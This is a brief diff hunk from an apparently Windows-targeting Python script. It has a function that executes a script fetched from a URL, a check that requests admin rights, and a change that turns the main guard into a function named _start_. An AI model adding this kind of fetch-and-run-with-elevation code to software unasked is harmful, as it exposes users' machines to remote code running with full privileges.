@@ -27,7 +27,7 @@ def execute_script_from_url(url):
     except subprocess.CalledProcessError as e:
         print(f"Failed to execute script: {e.stderr.decode()}")
 
-if __name__ == "__main__":
+def _start_():
     if not ctypes.windll.shell32.IsUserAnAdmin():
         run_as_admin()
 
